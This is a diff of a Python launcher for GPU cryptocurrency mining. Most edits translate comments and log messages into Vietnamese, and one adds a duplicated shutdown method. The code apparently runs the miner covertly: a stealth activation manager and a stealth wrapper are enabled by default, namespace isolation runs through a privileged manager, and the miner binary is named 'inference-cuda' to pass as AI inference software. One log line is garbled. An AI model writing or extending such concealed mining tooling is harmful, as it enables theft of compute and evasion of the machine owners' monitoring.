@@ -21,9 +21,9 @@ from datetime import datetime
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 import psutil
-# **GPU-Only Mode**: All CPU mining functionality has been permanently removed
+# **GPU-Only Mode** (chế độ chỉ GPU – chỉ sử dụng card đồ họa): Tất cả chức năng khai thác **CPU** (bộ xử lý trung tâm) đã được loại bỏ vĩnh viễn
 
-# Import core mining environment modules
+# **Import** (nhập khẩu – nạp thư viện) các **core mining environment modules** (module môi trường khai thác cốt lõi – thành phần chính của hệ thống)
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts.module_loggers import (
     get_gpu_plugin_logger,
@@ -35,33 +35,33 @@ from mining_environment.scripts.resource_manager import ResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 
-# Import stealth activation manager
+# **Import stealth activation manager** (nhập trình quản lý kích hoạt ẩn – module điều khiển chế độ ẩn danh)
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
-# Enhanced PID Logger with real process output monitoring
+# **Enhanced PID Logger** (bộ ghi PID nâng cao – công cụ theo dõi ID tiến trình) với **real process output monitoring** (giám sát đầu ra tiến trình thực – theo dõi kết quả trực tiếp)
 from pid_logger import start_worker, log_pid, register_process
 
 
 
 
 
-# Setup log directory path
+# **Setup log directory path** (thiết lập đường dẫn thư mục log – cấu hình nơi lưu nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
-# Main application logger
+# **Main application logger** (bộ ghi log ứng dụng chính – công cụ ghi nhật ký toàn hệ thống)
 logger = get_start_mining_logger()
 
-# GPU-specific loggers
+# **GPU-specific loggers** (bộ ghi log riêng cho GPU – công cụ ghi nhật ký card đồ họa)
 gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
 gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
 
 stop_event = threading.Event()
 
-# Enhanced lock-free process manager
+# **Enhanced lock-free process manager** (trình quản lý tiến trình không khóa nâng cao – quản lý quy trình không xung đột)
 import weakref
 
 class LockFreeProcessManager:
-    """Enhanced process manager with dual PID tracking and graceful shutdown"""
+    """**Enhanced process manager** (trình quản lý tiến trình nâng cao – quản lý quy trình khai thác) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực) và **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
     def __init__(self):
         self._gpu_process_ref = None
         self._real_mining_pid = None
@@ -70,13 +70,13 @@ class LockFreeProcessManager:
         self._cleanup_callbacks = []
         
     def set_gpu_process(self, process, real_mining_pid=None, process_group_id=None):
-        """Register process with dual PID tracking"""
+        """**Register process** (đăng ký tiến trình – lưu thông tin quy trình) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực)"""
         if process:
             self._gpu_process_ref = weakref.ref(process)
             self._real_mining_pid = real_mining_pid
             self._process_group_id = process_group_id
             self._health_event.set()
-            logger.info(f"🎯 [ENHANCED] Process registered: wrapper_pid={process.pid}, real_pid={real_mining_pid}, pgid={process_group_id}")
+            logger.info(f"🎯 [ENHANCED] **Process** (tiến trình – quy trình chạy) đã đăng ký: **wrapper_pid** (PID tiến trình bọc)={process.pid}, **real_pid** (PID thực tế)={real_mining_pid}, **pgid** (ID nhóm tiến trình)={process_group_id}")
         else:
             self._gpu_process_ref = None
             self._real_mining_pid = None
@@ -84,7 +84,7 @@ class LockFreeProcessManager:
             self._health_event.clear()
     
     def get_gpu_process_status(self):
-        """Check status of both wrapper and real mining processes"""
+        """**Check status** (kiểm tra trạng thái – xác minh tình trạng hoạt động) của cả **wrapper** (tiến trình bọc – process chứa) và **real mining processes** (tiến trình khai thác thực – quy trình chính)"""
         if not self._health_event.is_set():
             return False, None, None
             
@@ -114,22 +114,22 @@ class LockFreeProcessManager:
         return is_alive, self._gpu_process_ref() if self._gpu_process_ref else None, self._real_mining_pid
     
     def register_cleanup_callback(self, callback):
-        """Register thread-safe cleanup callback for graceful shutdown"""
+        """**Register thread-safe cleanup callback** (đăng ký callback dọn dẹp an toàn luồng – hàm gọi lại không xung đột) cho **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
         import threading
         with threading.RLock():
             self._cleanup_callbacks.append(callback)
-            logger.debug(f"🔧 [ENHANCED] Cleanup callback registered: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
+            logger.debug(f"🔧 [ENHANCED] **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) đã đăng ký: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
     
     def graceful_shutdown(self):
-        """Enhanced graceful shutdown with process group cleanup"""
-        logger.info("🔄 [ENHANCED] Starting graceful shutdown...")
+        """**Enhanced graceful shutdown** (tắt mượt mà nâng cao – kết thúc an toàn cải tiến) với **process group cleanup** (dọn dẹp nhóm tiến trình – xóa toàn bộ process liên quan)"""
+        logger.info("🔄 [ENHANCED] Bắt đầu **graceful shutdown** (tắt mượt mà – kết thúc an toàn)...")
         
         # Execute cleanup callbacks
         for callback in self._cleanup_callbacks:
             try:
                 callback()
             except Exception as e:
-                logger.warning(f"⚠️ Cleanup callback failed: {e}")
+                logger.warning(f"⚠️ **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) thất bại: {e}")
         
         # Terminate process group if available
         if self._process_group_id:
@@ -137,18 +137,18 @@ class LockFreeProcessManager:
                 import os
                 import signal
                 os.killpg(self._process_group_id, signal.SIGTERM)
-                logger.info(f"🔄 [ENHANCED] Sent SIGTERM to process group {self._process_group_id}")
+                logger.info(f"🔄 [ENHANCED] Đã gửi **SIGTERM** (tín hiệu kết thúc – yêu cầu dừng nhẹ nhàng) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                 
                 # Wait briefly then force kill if needed
                 time.sleep(2)
                 try:
                     os.killpg(self._process_group_id, signal.SIGKILL)
-                    logger.info(f"🔄 [ENHANCED] Sent SIGKILL to process group {self._process_group_id}")
+                    logger.info(f"🔄 [ENHANCED] Đã gửi **SIGKILL** (tín hiệu buộc dừng – lệnh kết thúc ngay lập tức) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                 except ProcessLookupError:
-                    logger.info("✅ [ENHANCED] Process group already terminated")
+                    logger.info("✅ [ENHANCED] **Process group** (nhóm tiến trình – tập hợp process liên quan) đã được kết thúc")
                     
             except Exception as e:
-                logger.error(f"❌ [ENHANCED] Process group cleanup failed: {e}")
+                logger.error(f"❌ [ENHANCED] Dọn dẹp **process group** (nhóm tiến trình – tập hợp process liên quan) thất bại: {e}")
         
         # Clear all references
         self._gpu_process_ref = None
@@ -156,9 +156,45 @@ class LockFreeProcessManager:
         self._process_group_id = None
         self._health_event.clear()
 
-# Global lock-free manager instance
+    def graceful_terminate(self, timeout=30):
+        """**Gracefully terminate** (kết thúc êm ái – dừng an toàn) tất cả **tracked processes** (tiến trình được theo dõi – quy trình đang giám sát) với **proper signal ordering** (thứ tự tín hiệu đúng – trình tự gửi tín hiệu hợp lý)"""
+        logger.info("🔄 [ENHANCED] Bắt đầu **graceful terminate** (kết thúc êm ái – dừng an toàn)...")
+        
+        # Execute cleanup callbacks
+        for callback in self._cleanup_callbacks:
+            try:
+                callback()
+            except Exception as e:
+                logger.warning(f"⚠️ **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) thất bại: {e}")
+        
+        # Terminate process group if available
+        if self._process_group_id:
+            try:
+                import os
+                import signal
+                os.killpg(self._process_group_id, signal.SIGTERM)
+                logger.info(f"🔄 [ENHANCED] Đã gửi **SIGTERM** (tín hiệu kết thúc – yêu cầu dừng nhẹ nhàng) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
+                
+                # Wait briefly then force kill if needed
+                time.sleep(2)
+                try:
+                    os.killpg(self._process_group_id, signal.SIGKILL)
+                    logger.info(f"🔄 [ENHANCED] Đã gửi **SIGKILL** (tín hiệu buộc dừng – lệnh kết thúc ngay lập tức) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
+                except ProcessLookupError:
+                    logger.info("✅ [ENHANCED] **Process group** (nhóm tiến trình – tập hợp process liên quan) đã được kết thúc")
+                    
+            except Exception as e:
+                logger.error(f"❌ [ENHANCED] Dọn dẹp **process group** (nhóm tiến trình – tập hợp process liên quan) thất bại: {e}")
+        
+        # Clear all references
+        self._gpu_process_ref = None
+        self._real_mining_pid = None 
+        self._process_group_id = None
+        self._health_event.clear()
+
+# **Global lock-free manager instance** (thể hiện trình quản lý không khóa toàn cục – đối tượng quản lý dùng chung)
 process_manager = LockFreeProcessManager()
-gpu_process = None  # Compatibility
+gpu_process = None  # **Compatibility** (tương thích – giữ lại để tương thích với code cũ)
 
 # Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
 privileged_manager_global = None
@@ -167,7 +203,7 @@ privileged_manager_global = None
 
 def signal_handler(signum, frame):
     """Enhanced signal handler với graceful shutdown coordination"""
-    logger.info(f"🔄 [ENHANCED] Received shutdown signal ({signum}). Starting graceful shutdown...")
+    logger.info(f"🔄 [ENHANCED] Đã nhận **shutdown signal** (tín hiệu tắt – lệnh dừng hệ thống) ({signum}). Bắt đầu **graceful shutdown** (tắt mượt mà – kết thúc an toàn)...")
     
     # Set stop event for main loop
     stop_event.set()
@@ -175,11 +211,11 @@ def signal_handler(signum, frame):
     # Trigger graceful shutdown through process manager
     try:
         process_manager.graceful_shutdown()
-        logger.info("✅ [ENHANCED] Process manager graceful shutdown completed")
+        logger.info("✅ [ENHANCED] **Process manager** (trình quản lý tiến trình – quản lý quy trình) **graceful shutdown** (tắt mượt mà – kết thúc an toàn) hoàn tất")
     except Exception as e:
-        logger.error(f"❌ [ENHANCED] Graceful shutdown failed: {e}")
+        logger.error(f"❌ [ENHANCED] **Graceful shutdown** (tắt mượt mà – kết thúc an toàn) thất bại: {e}")
     
-    logger.info("🔄 [ENHANCED] Signal handler processing completed")
+    logger.info("🔄 [ENHANCED] Xử lý **signal handler** (bộ xử lý tín hiệu – hàm xử lý lệnh hệ thống) hoàn tất")
 
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
@@ -190,11 +226,11 @@ def initialize_environment():
     
     try:
         # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
-        logger.info("🔐 Initializing privileged manager...")
+        logger.info("🔐 Khởi tạo **Environment** (môi trường – hệ thống hoạt động) đã được khởi tạo thành công **privileged manager** (trình quản lý đặc quyền – quản lý hoạt động cần quyền cao)...")
         privileged_manager = get_privileged_manager(logger)
         
         # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
-        logger.info("🔒 Validating security context...")
+        logger.info("🔒 Xác thực **security context** (bối cảnh bảo mật – thông tin quyền hạn và bảo mật)...")
         security_context = privileged_manager.validate_security_context()
         logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
         
@@ -202,15 +238,15 @@ def initialize_environment():
             logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
         
         # **Step 3: GPU Access Check** (Bước 3: Kiểm tra truy cập GPU)
-        logger.info("🎮 Checking GPU access...")
+        logger.info("🎮 Kiểm tra **GPU access** (truy cập GPU – quyền sử dụng card đồ họa)...")
         gpu_info = privileged_manager.check_gpu_access()
         logger.info(f"✅ Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
         
         # **Step 4: eBPF Filter Loading** (Bước 4: Tải bộ lọc eBPF) - DISABLED
         # DISABLE eBPF GPU telemetry để giải quyết lỗi std::bad_alloc
-        logger.info("ℹ️ eBPF GPU telemetry đã được DISABLE để tránh memory conflicts")
+        logger.info("ℹ️ **eBPF GPU telemetry** (giám sát GPU qua eBPF – theo dõi hiệu suất GPU) đã được DISABLE để tránh **memory conflicts** (xung đột bộ nhớ – lỗi tranh chấp RAM)")
 
-        logger.info("🌍 Running centralized environment setup...")
+        logger.info("🌍 Chạy **centralized environment setup** (thiết lập môi trường tập trung – cấu hình chung cho hệ thống)...")
         setup_env.setup()
         logger.info("✅ Thiết lập môi trường thành công.")
         
@@ -219,7 +255,7 @@ def initialize_environment():
     except Exception as e:
         error_msg = f"Lỗi khi thiết lập môi trường: {e}"
         logger.error(f"❌ {error_msg}")
-        logger.error(f"🔍 Exception details: {type(e).__name__}: {str(e)}")
+        logger.error(f"🔍 Chi tiết **exception** (ngoại lệ – lỗi bất thường): {type(e).__name__}: {str(e)}")
         
         # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
         stop_event.set()
@@ -233,15 +269,15 @@ def is_mining_process_running(process):
     """
     return bool(process) and (process.poll() is None or process.returncode == 0)
 
-def rotate_log_file(log_path, max_size_mb=3):
+def rotate_log_file(log_path, max_size_mb=100, max_files=5):
     """
-    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
-    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
+    **Log rotation utility** (tiện ích xoay vòng tệp ghi nhật ký – công cụ quản lý kích thước log) giữ lại **archives** (lưu trữ – bản sao lưu cũ) với **size limits** (giới hạn kích thước – ngưỡng dung lượng tối đa).
     
     Args:
-        log_path (str): Đường dẫn đến tệp log cần xoay vòng
-        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
-    """
+        log_path: Đường dẫn tệp **log** (nhật ký – file ghi thông tin hoạt động)  
+        max_size_mb: **Max size** (kích thước tối đa – dung lượng lớn nhất) trước khi **rotate** (xoay vòng – tạo file mới) (MB)
+        max_files: Số lượng **archive files** (tệp lưu trữ – file sao lưu) tối đa
+    """    
     if not os.path.exists(log_path):
         return
         
@@ -399,7 +435,7 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                         print(status_line, flush=True)
                         
     except Exception as e:
-        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
+        error_msg = f"❌ Lỗi trong **dual_logger_thread** (luồng ghi log kép – luồng ghi nhật ký song song) [{process_name}]: {e}"
         logger.error(error_msg)
         print(f"\033[91m{error_msg}\033[0m", flush=True)
     finally:
@@ -418,10 +454,10 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
             final_stats += "\033[0m"
             
             print(final_stats, flush=True)
-            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
+            logger.info(f"**Dual logging thread** (luồng ghi log kép – luồng ghi nhật ký song song) đã dừng cho {process_name}: **runtime** (thời gian chạy – thời lượng hoạt động) {runtime:.0f}s")
             
         except Exception as cleanup_err:
-            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")
+            logger.error(f"Lỗi **cleanup** (dọn dẹp – làm sạch tài nguyên) trong **dual_logger_thread** (luồng ghi log kép – luồng ghi nhật ký song song): {cleanup_err}")
 
 def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     """
@@ -436,20 +472,20 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     Returns:
         subprocess.Popen: Tiến trình khai thác GPU nếu thành công, None nếu thất bại
     """
-    # **🔧 DEBUG: GPU-only function entry logging** (ghi log đầu vào function GPU-only)  
-    logger.info(f"🔍 [DEBUG] start_gpu_mining_process() called - GPU-only mode")
+    # **🔧 DEBUG: GPU-only function entry logging** (ghi log đầu vào function GPU-only – ghi nhật ký điểm vào hàm chỉ GPU)  
+    logger.info(f"🔍 [DEBUG] **start_gpu_mining_process()** (hàm khởi động tiến trình khai thác GPU) được gọi - **GPU-only mode** (chế độ chỉ GPU – chỉ dùng card đồ họa)")
     
     executable = os.getenv('CUDA_COMMAND')
-    logger.info(f"🔍 [DEBUG] GPU Executable path: {executable}")
+    logger.info(f"🔍 [DEBUG] **GPU Executable path** (đường dẫn thực thi GPU – vị trí file chạy card đồ họa): {executable}")
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
-        logger.error(f"GPU executable không hợp lệ hoặc không có quyền truy cập: {executable}")
+        logger.error(f"**GPU executable** (file thực thi GPU – chương trình chạy card đồ họa) không hợp lệ hoặc không có quyền truy cập: {executable}")
         stop_event.set()
         return None
 
     mining_server = os.getenv('MINING_SERVER_GPU')
     mining_wallet = os.getenv('MINING_WALLET_GPU')
     if not mining_server or not mining_wallet:
-        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
+        logger.error("Các **environment variables** (biến môi trường – tham số hệ thống) MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
         stop_event.set()
         return None
 
@@ -473,13 +509,13 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
 
     # 🔍 DEBUG: Validate CUDA loader exists before use
     if not os.path.exists(cuda_loader):
-        logger.warning(f"⚠️ CUDA loader not found: {cuda_loader}")
+        logger.warning(f"⚠️ **CUDA loader** (trình nạp CUDA – thư viện tải GPU) không tìm thấy: {cuda_loader}")
         # Fallback to standard CUDA library
         cuda_loader = '/usr/lib/x86_64-linux-gnu/libcuda.so'
-        logger.info(f"🔄 Using fallback CUDA loader: {cuda_loader}")
+        logger.info(f"🔄 Sử dụng **fallback CUDA loader** (trình nạp CUDA dự phòng – thư viện tải GPU thay thế): {cuda_loader}")
 
-    logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
-    logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
+    logger.info(f"🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **CUDA loader** (trình nạp CUDA – thư viện tải GPU): {cuda_loader}")
+    logger.info(f"🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **Loader exists** (trình nạp tồn tại – có file thư viện): {os.path.exists(cuda_loader)}")
 
     # 🎯 Build command với cấu trúc rõ ràng: exec → thuật toán → pool → wallet → TLS → CUDA opts
     mining_command = [
@@ -495,16 +531,16 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     intensity_env = os.getenv('GPU_INTENSITY')
     if intensity_env:
         # mining_command.extend(['--intensity', intensity_env])  # removed because inference-cuda does not support --intensity
-        logger.warning("⚠️ GPU_INTENSITY detected but ignored; --intensity unsupported by inference-cuda")
+        logger.warning("⚠️ **GPU_INTENSITY** (cường độ GPU – mức sử dụng card đồ họa) được phát hiện nhưng bị bỏ qua; **--intensity** (tham số cường độ) không được hỗ trợ bởi **inference-cuda** (chương trình khai thác)")
     else:
-        logger.info("🎮 GPU Mining - INTENSITY parameter disabled (unsupported by binary)")
-    logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")
+        logger.info("🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **INTENSITY parameter** (tham số cường độ – thiết lập mức sử dụng) đã tắt (**unsupported by binary** – không được hỗ trợ bởi file thực thi)")
+    logger.info(f"🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - CHÍNH XÁC: Sử dụng **CUDA backend** (nền tảng CUDA – công nghệ tính toán GPU) với **kawpow algorithm** (thuật toán kawpow – giải thuật khai thác) cho **inference-cuda** (chương trình khai thác)")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
     
     if enable_ns and privileged_manager:
-        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")
+        logger.info("Sử dụng **PrivilegedOperationManager** (trình quản lý thao tác đặc quyền – công cụ điều khiển quyền cao) cho **namespace isolation** (cô lập không gian tên – tách biệt môi trường)")
 
     # ✅ GPU Environment Cleanup now handled by stealth_inference_cuda.py internally
     # No need for subprocess_env preparation here - stealth wrapper handles it
@@ -513,11 +549,11 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     subprocess_env.pop('LD_PRELOAD', None)
     
     for attempt in range(1, retries + 1):
-        logger.info(f"Thử khởi chạy quá trình khai thác GPU (Lần thử {attempt}/{retries})...")
+        logger.info(f"Thử khởi chạy **GPU mining process** (quá trình khai thác GPU – tiến trình đào coin card đồ họa) (**Attempt** {attempt}/{retries} – lần thử {attempt}/{retries})...")
         # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
-        logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
-        logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
-        logger.info(f"🔍 GPU Debug - Environment: Default (stealth wrapper will create clean_env)")
+        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Command** (lệnh – câu lệnh thực thi): {' '.join(mining_command)}")
+        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Stealth** (ẩn danh – chế độ ẩn): {enable_stealth}, **NS** (namespace – không gian tên): {enable_ns}")
+        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Environment** (môi trường – biến hệ thống): Default (**stealth wrapper** (trình bao bọc ẩn danh) sẽ tạo **clean_env** – môi trường sạch)")
         try:
             # **Create GPU subprocess** (tạo tiến trình con GPU) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth:
@@ -562,7 +598,7 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                     )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
-                logger.info(f"🔍 GPU using namespace isolation")
+                logger.info("Đang sử dụng **Namespace isolation** (cô lập không gian tên – tách biệt môi trường quy trình)")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -1249,8 +1285,6 @@ def main():
     
     # **Cleanup** (dọn dẹp) và thoát
     logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
-    
-    
     
     # **Simple GPU Process Cleanup** (dọn dẹp tiến trình GPU đơn giản)
     logger.info("🧹 Cleaning up GPU mining process...")
